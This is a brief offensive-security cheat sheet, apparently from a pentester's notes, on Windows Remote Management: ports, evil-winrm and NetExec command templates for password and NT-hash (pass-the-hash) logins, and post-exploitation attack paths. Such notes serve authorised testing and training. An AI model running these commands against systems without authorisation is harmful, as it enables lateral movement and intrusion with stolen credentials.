# WinRM

## Overview

Windows Remote Management access and operator workflow for credentialed PowerShell remoting.

## Default Ports

- 5985/tcp HTTP, 5986/tcp HTTPS


## Tooling Note

- `nxc` / NetExec examples are preferred where present.
- Some legacy `crackmapexec` command lines were intentionally retained for searchability because the source vault used them heavily and operators still encounter them in older notes and scripts.

## evil-winrm

https://github.com/Hackplayers/evil-winrm
```
evil-winrm -i <ip> -u <username> -p '<password>' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

## Quick Enumeration

```bash
nxc winrm <target> -u <user> -p '<password>'
nxc winrm <target> -u <user> -H '<nthash>'
evil-winrm -i <target> -u <user> -p '<password>'
evil-winrm -i <target> -u <user> -H '<nthash>'
```

## Common Attack Paths

- Credential reuse for remote PowerShell access.
- Local admin validation and immediate post-exploitation without a GUI.
- File upload/download and PowerShell-based tooling from an interactive shell.

## See Also

- `04 Windows/PowerShell.md`
- `03 AD/Lateral Movement Replication and Delegation.md`
